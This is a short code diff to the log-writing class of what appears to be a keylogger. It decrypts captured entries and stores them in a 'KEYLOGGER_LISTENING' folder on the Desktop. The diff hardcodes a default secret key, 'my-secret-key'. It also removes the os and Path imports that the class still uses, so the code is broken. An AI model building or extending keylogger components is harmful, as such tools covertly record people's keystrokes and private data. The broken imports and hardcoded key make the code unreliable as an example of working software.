@@ -1,13 +1,11 @@
-import os
-from pathlib import Path
-from datetime import datetime
 from encryptor import Encryptor
 
 class FileWriter:
-    def __init__(self, base_dir_name="KEYLOGGER_LISTENING"):
+    def __init__(self, base_dir_name="KEYLOGGER_LISTENING", key="my-secret-key"):
         desktop = Path.home() / "Desktop"
         self.base_dir = desktop / base_dir_name
         os.makedirs(self.base_dir, exist_ok=True)
+        self.decryptor = Encryptor(key)
 
     def write(self, log_entry):
         try:
@@ -18,7 +16,7 @@ class FileWriter:
             if log_entry.startswith("("):
                 message = f"{log_entry}\n"
             else:
-                decrypted = Encryptor.decrypt(log_entry)
+                decrypted = self.decryptor.decrypt(log_entry)
                 parts = decrypted.split(" | ")
                 if len(parts) > 1:
                     message = f"{parts[0]} | {parts[1]}\n"
